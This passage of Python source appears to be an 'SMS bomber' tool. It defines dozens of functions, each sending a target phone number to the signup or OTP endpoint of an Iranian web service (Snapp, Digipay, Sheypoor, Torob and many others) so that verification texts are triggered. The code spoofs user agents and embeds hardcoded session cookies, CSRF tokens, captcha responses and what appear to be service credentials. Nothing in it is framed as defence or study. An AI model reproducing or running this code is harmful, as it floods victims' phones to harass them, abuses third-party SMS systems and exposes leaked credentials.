            post("https://gateway.wisgoon.com/api/v1/auth/login/",json={"phone": "0"+phone.split("+98")[1], "recaptcha-response": "03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg","token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"}, headers={"Host": "gateway.wisgoon.com","content-length": "582","accept": "application/json","save-data": "on","user-agent": generate_user_agent(os="android"),"content-type": "application/json","origin": "https://m.wisgoon.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.wisgoon.com/","accept-encoding": "gzip, deflate, br","accept-language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7", }, timeout=5)
            return True
        except:
            pass


    def digipay(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://app.mydigipay.com/digipay/api/users/send-sms", json={"cellNumber": "0"+phone.split("+98")[1], "device": {"deviceId": "a16e6255-17c3-431b-b047-3f66d24c286f", "deviceModel": "WEB_BROWSER", "deviceAPI": "WEB_BROWSER", "osName": "WEB"}},headers=rhead, timeout=5)
            return True
        except:
            pass


    def gap(phone):
        gapH = {"Host": "core.gap.im", "accept": "application/json, text/plain, */*", "x-version": "4.5.7", "accept-language": "fa","user-agent": generate_user_agent(os="android"), "appversion": "web", "origin": "https://web.gap.im", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://web.gap.im/", "accept-encoding": "gzip, deflate, br"}
        try:
            get(url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH).text
            return True
        except:
            pass


    def torob(phone):
        phone = '0'+phone.split('+98')[1]
        torobH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cookie': 'abtest=next_pwa; search_session=ofwjiyqqethomevqrgzxvopjtgkgimdc; _gcl_au=1.1.805505755.1639260830; _gid=GA1.2.683761449.1639260830; _gat_UA-105982196-1=1; _ga_CF4KGKM3PG=GS1.1.1639260830.1.0.1639260830.0; _clck=130ifw1|1|ex6|0; _ga=GA1.2.30224238.1639260830','origin': 'https://torob.com','referer': 'https://torob.com/','user-agent': generate_user_agent(os="linux")}
        try:
            torobR = get(url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}", headers=torobH)
            return True
        except:
            pass


    def taghche(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://gw.taaghche.com/v4/site/auth/signup",json={"contact": "0"+phone.split("+98")[1]},headers=rhead, timeout=5)
            return True
        except:
            pass


    def namava(num):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",json={"UserName": phone},headers=rhead ,timeout=5)
            return True
        except:
            pass


    def sheypoor(phone):
        sheyporH = {"Host": "www.sheypoor.com", "User-Agent": generate_user_agent(os="win"), "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Content-Length": "62", "Origin": "https://www.sheypoor.com", "Connection": "keep-alive", "Referer": "https://www.sheypoor.com/session","Cookie": "plog=False; _lba=false; AMP_TOKEN=%24NOT_FOUND; ts=46f5e500c49277a72f267de92dd51238; track_id=22f97cea33f34e368e4b3edd23afd391; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=3f475c6e-f55b-0d29-de67-6cdc46bc6592; analytics_token=3cce634d-040a-baf3-fdd6-552578d672df; yektanet_session_last_activity=8/13/2020; _yngt=0bc37b56-6478-488b-c801-521f101259fd; _lbsa=false; _ga=GA1.2.1464689488.1597346921; _gid=GA1.2.1551213293.1597346921; _gat=1", "TE": "Trailers"}
        sheyporD = {"username": "0"+phone.split("+98")[1]}
        try:
            post(url='https://www.sheypoor.com/auth', headers=sheyporH, data=sheyporD)
            return True
        except:
            pass


    def doctor(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            get(f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{phone.split("+98")[1]}/sms?cCode=+98', headers=rhead, timeout=5)
            return True
        except:
            pass


    def achar(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://api.achareh.ir/v2/accounts/login/',data={"phone": "0"+phone.split("+98")[1], "utm_source": "null"}, headers=rhead ,timeout=5)
            return True
        except:
            pass


    def snapp(num):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://api.snapp.ir/api/v1/sms/link',json={"phone": "0"+phone.split("+98")[1]},headers=rhead ,timeout=5)
            return True
        except:
            pass


    def tap30(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://api.tapsi.cab/api/v2/user', json={"credential": {"phoneNumber": "0"+phone.split("+98")[1], "role": "PASSENGER"}}, headers=rhead, timeout=5)
            return True
        except:
            pass


    def tmg(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://tagmond.com/phone_number', data='utf8=%E2%9C%93&phone_number=' +"0"+phone.split("+98")[1]+'&g-recaptcha-response=', headers=rhead)
            return True
        except:
            pass


    def a4baz(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://a4baz.com/api/web/login',json={"cellphone": "0"+phone.split("+98")[1]}, headers=rhead)
            return True
        except:
            pass


    def doctoreto(phone):
        try:
            post('https://api.doctoreto.com/api/web/patient/v1/accounts/register', 
            json={"mobile": "0"+phone.split("+98")[1], "country_id": 205}, 
            headers={'Connection': 'keep-alive','Accept': 'application/json','X-Requested-With': 'XMLHttpRequest','User-Agent': generate_user_agent(os="win"),'Content-Type': 'application/json;charset=UTF-8','Origin': 'https://doctoreto.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://doctoreto.com/','Accept-Language': 'en-US,en;q=0.9'})
            return True
        except:
            pass


    def okorosh(phone):
        okJ = {"mobile": "0"+phone.split("+98")[1],"g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"}
        okU = 'https://my.okcs.com/api/check-mobile'
        okH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json;charset=UTF-8','cookie': '_ga=GA1.2.1201761975.1639324247; XSRF-TOKEN=eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0%3D; myokcs_session=eyJpdiI6InlYaXBiTUw1dHFKM05rN0psNjlwWXc9PSIsInZhbHVlIjoiNDg1QWJQcGwvT3NUOS9JU1dSZGk2K2JkVlNVV2wrQWxvWGVEc0d1MDR1aTNqVSs4Z0llSDliMW04ZFpGTFBUOG82NEJNMVFmTmNhcFpzQmJVTkpQZzVaUEtkSnFFSHU0RFprcXhWZlY0Zit2UHpoaVhLNXdmdUZYN1RwTnVLUFoiLCJtYWMiOiI5NTUwMmI2NDhkNWJjNDgwOGNmZjQxYTI4YjA0OTFjNTQ5NDc0YWJiOWIwZmI4MTViMWM0NDA4OGY5NGNhOGIzIn0%3D','origin': 'https://my.okcs.com','referer': 'https://my.okcs.com/','user-agent': generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest','x-xsrf-token': 'eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0='}
        try:
            post(url=okU, headers=okH, json=okJ).text
            return True
        except:
            pass


    def gapfilm(phone):
        gaJ = {"Type": 3,"Username": phone.split("+98")[1],"SourceChannel": "GF_WebSite","SourcePlatform": "desktop","SourcePlatformAgentType": "Opera","SourcePlatformVersion": "82.0.4227.33","GiftCode": None}
        gaU = 'https://core.gapfilm.ir/api/v3.1/Account/Login'
        gaH = {'Accept': 'application/json, text/plain, */*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'fa','Browser': 'Opera','BrowserVersion': '82.0.4227.33','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'core.gapfilm.ir','IP': '185.156.172.170','Origin': 'https://www.gapfilm.ir','OS': 'Linux','Referer': 'https://www.gapfilm.ir/','SourceChannel': 'GF_WebSite','User-Agent': generate_user_agent(os="linux")}
        try:
            post(url=gaU, headers=gaH, json=gaJ)
            return True
        except:
            pass


    def anar(phone):
        anrJ = {'user': phone, 'app_id': 99}
        anrU = 'https://api.anargift.com/api/people/auth'
        anrH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '34','content-type': 'application/json;charset=UTF-8','origin': 'https://anargift.com','referer': 'https://anargift.com/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=anrU, headers=anrH, json=anrJ)
            return True
        except:
            pass


    def azki(phone):
        azkU = f'https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_{phone}"%7D'
        azkH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==','device': 'web','deviceid': '6','password': 'BimitoSecret','origin': 'https://www.azki.com','referer': 'https://www.azki.com/','user-agent': generate_user_agent(os="linux"),'user-token': 'LW6H4KSMStwwKXWeFey05gtdw2iW8QRtSk70phP6tBJindQ4irdzTmSqDI9TkVqE','username': 'BimitoClient'
        }
        try:
            post(url=azkU, headers=azkH)
            return True
        except:
            pass


    def nobat(phone):
        noJ = {'mobile': phone}
        noU = 'https://nobat.ir/api/public/patient/login/phone'
        noH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','access-control-request-headers': 'nobat-cookie','access-control-request-method': 'POST','origin': 'https://user.nobat.ir','referer': 'https://user.nobat.ir/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=noU, headers=noH, json=noJ)
            return True
        except:
            pass


    def lendo(phone):
        leD = {'_token': 'mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6','mobile': '0'+phone.split('+98')[1],'password': 'ibvvb@3#9nc'}
        leU = 'https://lendo.ir/register?'
        leH = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Cookie': 'lendo_session=eyJpdiI6Imh2QXVnS3Q1ejFvQllhSVgzRTZORVE9PSIsInZhbHVlIjoicFE0VzJWc016a3BHXC9CRTE3S21OSXV0XC84U015VTJwdDBRVWZNUDRIUmxmS1gwSDR5NVEwQlhmaUlMdTM2XC9EQyIsIm1hYyI6ImMzMWRhYWE1ODA3MTE1ZGI5ZGIxNTAxNTg5NzBhNWYzNjZjNzk2MDNhYWNlNTU1OTc5ZTYzNjNmYWU5OGZiMWIifQ%3D%3D','Host': 'lendo.ir','Origin': 'https://lendo.ir','Referer': 'https://lendo.ir/register','Upgrade-Insecure-Requests': '1','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=leU, headers=leH, data=leD).text
            return True
        except:
            pass


    def olgoo(phone):
        olD = {'contactInfo[mobile]': '0'+phone.split('+98')[1],'contactInfo[agreementAccepted]': '1','contactInfo[teachingFieldId]': '1','contactInfo[eduGradeIds][7]': '7','submit_register': '1'}
        olU = 'https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox'
        olH = {'Accept': 'text/plain, */*; q=0.01','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Length': '163','Content-Type': 'application/x-www-form-urlencoded','Cookie': 'PHPSESSID=l1gv6gp0osvdqt4822vaianlm5','Host': 'www.olgoobooks.ir','Origin': 'https://www.olgoobooks.ir','Referer': 'https://www.olgoobooks.ir/sn/userRegistration/','X-Requested-With': 'XMLHttpRequest','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=olU, headers=olH, data=olD).text
            return True
        except:
            pass


    def pakhsh(phone):
        paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split("+98")[1]}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'
        paU = 'https://www.pakhsh.shop/wp-admin/admin-ajax.php'
        paH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98; _wpfuuid=b21e7550-db54-469f-846d-6993cfc4815d','origin': 'https://www.pakhsh.shop','referer': 'https://www.pakhsh.shop/%D9%85%D8%B1%D8%A7%D8%AD%D9%84-%D8%AB%D8%A8%D8%AA-%D8%B3%D9%81%D8%A7%D8%B1%D8%B4-%D9%88-%D8%AE%D8%B1%DB%8C%D8%AF/','user-agent': generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url=paU, headers=paH, data=paD)
            return True
        except:
            pass


    def didnegar(phone):
        paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split("+98")[1]}&csrf=4c9ac22ff4&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone.split("+98")[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=4c9ac22ff4'
        paU = 'https://www.didnegar.com/wp-admin/admin-ajax.php'
        paH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'PHPSESSID=881f0d244b83c1db49d4c39e5fe7b108; digits_countrycode=98; _5f9d3331dba5a62b1268c532=true','origin': 'https://www.didnegar.com','referer': 'https://www.didnegar.com/my-account/?login=true&back=home&page=1','user-agent': generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url=paU, headers=paH, data=paD)
            return True
        except:
            pass


    def baskol(phone):
        baJ = {"phone": '0'+phone.split('+98')[1]}
        baU = 'https://www.buskool.com/send_verification_code'
        baH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json;charset=UTF-8','cookie': 'laravel_session=2Gp6A82VC8CPMgaB7sI0glrGP52XyjXNKnNAeZq3','origin': 'https://www.buskool.com','referer': 'https://www.buskool.com/register','user-agent': generate_user_agent(os="linux"),'x-csrf-token': 'trUVHIRWtjE58Fn9Pud1ciz2XaTbTgFHgCLsPykD','x-requested-with': 'XMLHttpRequest'}
        try:
            post(url=baU, headers=baH, json=baJ)
            return True
        except:
            pass


    def basalam(phone):
        baJ = {"variables": {"mobile": '0'+phone.split('+98')[1]},"query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"}
        baU = 'https://api.basalam.com/user'
        baH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Bearer undefined','content-length': '168','content-type': 'application/json;charset=UTF-8','origin': 'https://basalam.com','referer': 'https://basalam.com/','user-agent': generate_user_agent(os="linux"),'x-client-info': '{"name":"web.public"}','x-creation-tags': '{"app":"web","client":"customer","os":"linux","device":"desktop","uri":"/accounts","fullPath":"/accounts","utms":"organic","landing_url":"basalam.com%2Faccounts","tag":[null]}'}
        try:
            post(url=baU, headers=baH, json=baJ)
            return True
        except:
            pass


    def see5(phone):
        seD = {'mobile': '0'+phone.split('+98')[1],'action': 'sendsms'}
        seU = 'https://crm.see5.net/api_ajax/sendotp.php'
        seH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '33','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': '_ga=GA1.2.1824452401.1639326535; _gid=GA1.2.438992536.1639326535; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; crisp-client%2Fsession%2Fc55c0d24-98fe-419a-862f-0b31e955fd59=session_812ec81d-13c1-4a69-a494-ad54e1f290ef; __utma=55084201.1824452401.1639326535.1639326540.1639326540.1; __utmc=55084201; __utmz=55084201.1639326540.1.1.utmcsr=Ads|utmgclid=EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE|utmccn=Exact-shopsaz|utmcmd=cpc|utmctr=(not%20provided); _gac_UA-62787234-1=1.1639326540.EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE; __utmt=1; __utmb=55084201.3.10.1639326540; WHMCSkYBsAa1NDZ2k=6ba6de855ce426e25ea6bf402d1dc09c','origin': 'https://crm.see5.net','referer': 'https://crm.see5.net/clientarea.php','user-agent': generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url=seU, headers=seH, data=seD).text
            return True
        except:
            pass


    def ghabzino(phone):
        ghJ = {"Parameters": {"ApplicationType": "Web","ApplicationUniqueToken": None,"ApplicationVersion": "1.0.0","MobileNumber": '0'+phone.split('+98')[1]}}
        ghU = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
        ghH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','origin': 'https://ghabzino.com','referer': 'https://ghabzino.com/','user-agent': generate_user_agent(os="linux")}
        try:
            get(url=ghU, headers=ghH, json=ghJ)
            return True
        except:
            pass


    def simkhanF(phone):
        ghJ = {"mobileNumber": '0'+phone.split('+98')[1],"ReSendSMS": False}
        ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
        ghH = {'Accept': 'application/json','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Authorization': 'Bearer undefined','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'www.simkhanapi.ir','Origin': 'https://simkhan.ir','Referer': 'https://simkhan.ir/','User-Agent': generate_user_agent(os="linux")}
        try:
            post(url=ghU, headers=ghH, json=ghJ)
            return True
        except:
            pass


    def simkhanT(phone):
        ghJ = {"mobileNumber": '0'+phone.split('+98')[1],"ReSendSMS": True}
        ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
        ghH = {'Accept': 'application/json','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Authorization': 'Bearer undefined','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'www.simkhanapi.ir','Origin': 'https://simkhan.ir','Referer': 'https://simkhan.ir/','User-Agent': generate_user_agent(os="linux")}
        try:
            post(url=ghU, headers=ghH, json=ghJ)
            return True
        except:
            pass


    def drsaina(phone):
        ghD = f"__RequestVerificationToken=CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber={'0'+phone.split('+98')[1]}&confirmCode=&fullName=&Password=&Password2="
        ghU = 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation'
        ghH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','cookie': '.AspNetCore.Antiforgery.ej9TcqgZHeY=CfDJ8NPBKm5eTodHlBQhmwjQAVWqg8-UO73YXzMYVhYk28IlZQexrnyEhYldxs2Ylnp3EZE2o3tccNQ0E7vRSUGVMNDfmcFOKPcUCG7sysT7unE5wui_vwzMvyCNDqIRZ1Wxd2AKD3s3lu-2BvFOXc_j7ts; anonymousId=-fmvaw07O1miRXbHtKTVT; segmentino-user={"id":"-fmvaw07O1miRXbHtKTVT","userType":"anonymous"}; _613757e830b8233caf20b7d3=true; _ga=GA1.2.1051525883.1639482327; _gid=GA1.2.2109855712.1639482327; __asc=bf42042917db8c3006a2b4dcf49; __auc=bf42042917db8c3006a2b4dcf49; analytics_token=a93f2bb1-30d0-4e99-18cc-b84fcda27ae9; yektanet_session_last_activity=12/14/2021; _yngt_iframe=1; _gat_UA-126198313-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_session_token=efcee442-344d-1374-71b8-60ca960029c9; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _gac_UA-126198313-1=1.1639482345.EAIaIQobChMImrmRrJvj9AIV2ZTVCh07_gUpEAAYASAAEgILoPD_BwE; cache_events=true','origin': 'https://www.drsaina.com','referer': 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation','upgrade-insecure-requests': '1','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=ghU, headers=ghH, data=ghD).text
            return True
        except:
            pass


    def limome(phone):
        liD = {'mobileNumber': phone.split('+98')[1],'country': '1'}
        liU = 'https://my.limoome.com/api/auth/login/otp'
        liH = {'Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'sess=00da3860-929a-4429-aef9-82bb64f9a439; basalam-modal=1','Host': 'my.limoome.com','Origin': 'https://my.limoome.com','Referer': 'https://my.limoome.com/login?redirectlogin=%252Fdiet%252Fpayment','User-Agent': generate_user_agent(os="linux"),'X-Requested-With': 'XMLHttpRequest'}
        try:
            post(url=liU, headers=liH, data=liD)
            return True
        except:
            pass


    def bimito(phone):
        liU = f"https://bimito.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%220{phone.split('+98')[1]}%22%7D"
        liH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cookie': '_gcl_aw=GCL.1639580987.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _gcl_au=1.1.1134321035.1639580987; _ga=GA1.2.74824389.1639580987; _gid=GA1.2.40868592.1639580992; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_token=9fbae680-00a7-8cbf-6be6-90980eae790f; yektanet_session_last_activity=12/15/2021; _yngt_iframe=1; _gac_UA-89339097-1=1.1639580999.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _clck=dlyt9o|1|exa|0; crisp-client%2Fsession%2Fbde9082c-438a-4943-b9b5-362fed0a182a=session_2fdd45a5-8c9d-4638-b21a-40a2ebd422db; _clsk=ktdj0|1639581807259|2|1|d.clarity.ms/collect; _ga_5LWTRKET98=GS1.1.1639580986.1.1.1639581904.60','device': 'web','deviceid': '3','origin': 'https://bimito.com','referer': 'https://bimito.com/','user-agent': generate_user_agent(os="linux"),'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
        try:
            post(url=liU, headers=liH)
            return True
        except:
            pass


    def seebirani(phone):
        liJ = {"username": "0"+phone.split('+98')[1]}
        liU = "https://sandbox.sibirani.ir/api/v1/user/invite"
        liH = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','origin': 'https://developer.sibirani.com','referer': 'https://developer.sibirani.com/','user-agent': generate_user_agent(os="mac")}
        try:
            post(url=liU, headers=liH, json=liJ)
            return True
        except:
            pass


    def mihanpezeshk(phone):
        gaD = f'_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={"0"+phone.split("+98")[1]}&recaptcha='
        gaU = 'https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient'
        gaH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','cookie': 'XSRF-TOKEN=eyJpdiI6IitzYVZRQzFLdGlKNHRHRjIxb3R4VWc9PSIsInZhbHVlIjoianR6SXBJXC9rUStMRCs0ajUzalNjM1pMN053bUNtSlJ5dzYrVzFxV1dtXC9SREp4OTJ0Wm1RWW9yRVwvM29Cc3l4SCIsIm1hYyI6IjdjODczZWI4Y2Q2N2NhODVkNjE5YTRkOWVhNjRhNDRlNmViZjhlNDVkNDYwODFkNzViOTU2ZTdjYTUwZjhjMWUifQ%3D%3D; laravel_session=eyJpdiI6ImU3dlpRdXV1XC9TMmJEWk1LMkFTZGJRPT0iLCJ2YWx1ZSI6IktHTWF0bFlJU0VqVCthamp5aW1GRHdBM1lNcjNMcVFxMWM5Ynd3clZLQzdva2ZJWXRiRU4xaUhyMnVHMG90RkUiLCJtYWMiOiJkZWRmMGM5YzFiNDNiOTJjYWFiZDc0MjYxMDUyMzBmYTMzMmI5ZTBkODA1YTMxODQyYzM2NjVjZWExZmYwMzdhIn0%3D','origin': 'https://www.mihanpezeshk.com','referer': 'https://www.mihanpezeshk.com/confirmcodePatient','upgrade-insecure-requests': '1','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=gaU, headers=gaH, data=gaD)
            return True
        except:
            pass


    def mek(phone):
        meU = 'https://www.hamrah-mechanic.com/api/v1/auth/login'
